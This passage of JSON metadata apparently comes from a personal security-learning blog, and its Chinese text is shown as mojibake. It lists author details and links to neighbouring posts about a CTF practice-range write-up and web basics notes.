æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"æ”»é˜²ä¸–ç•Œé¶åœºwp","uid":"c1355e18e08f584a9698a2879b69aeba","slug":"wp-Gongfang","date":"2022-06-21T14:06:24.391Z","updated":"2023-10-04T15:10:59.861Z","comments":true,"path":"api/articles/wp-Gongfang.json","keywords":null,"cover":"/img/34.jpg","text":"è¿™ä¸ªçº¿ä¸Šé¶åœºæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œè€Œä¸”éš¾åº¦åˆ†å¸ƒä¹Ÿå¥½ï¼Œå¾ˆä¼˜ç§€çš„çº¿ä¸Šé¶åœºï¼Œéå¸¸å€¼å¾—ä»”ç»†å­¦ä¹ ç ”ç©¶ä¸€ä¸‹ ...åŠŸé˜²ä¸–ç•Œçªç„¶æ”¹ç‰ˆäº†ï¼ŒæŠŠé¢˜å¼„æˆä¸€å †äº†ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰éš¾åº¦ç³»æ•°ï¼Œä¸è¿‡ä¹Ÿæ–¹...","permalink":"/post/wp-Gongfang","photos":[],"count_time":{"symbolsCount":"30k","symbolsTime":"28 mins."},"categories":[{"name":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","slug":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","count":26,"path":"api/categories/ç½‘ç»œå®‰å…¨å­¦ä¹ .json"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","count":5,"path":"api/tags/é¶åœº.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"webåŸºç¡€éšè®°","uid":"8009cc0308ef2b434146ef92878679ee","slug":"Noteless","date":"2022-05-30T16:15:39.751Z","updated":"2023-10-04T13:21:45.987Z","comments":true,"path":"api/articles/Noteless.json","keywords":null,"cover":"/img/20.jpg","text":"éšä¾¿è®°ä¸€ä¸‹ï¼Œå¤§éƒ½å¸¸æ··æ·†æˆ–è€…æ˜“å¿˜åŸºç¡€çŸ¥è¯† ç½‘ç«™è¿æ¥é‡ç½®ï¼Œç”¨æ¸…ç©ºç¼“å­˜å’ŒCookieè§£å†³ä»Šå¤©åœ¨æ‰“buuctfé¶åœºçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“é¡µé¢è·³è½¬æ—¶ï¼Œä¼šæ˜¾ç¤ºè¿æ¥é‡ç½®ï¼Œ...","permalink":"/post/Noteless","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"web","slug":"web","count":2,"path":"api/categories/web.json"}],"tags":[{"name":"daily","slug":"daily","count":2,"path":"api/tags/daily.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}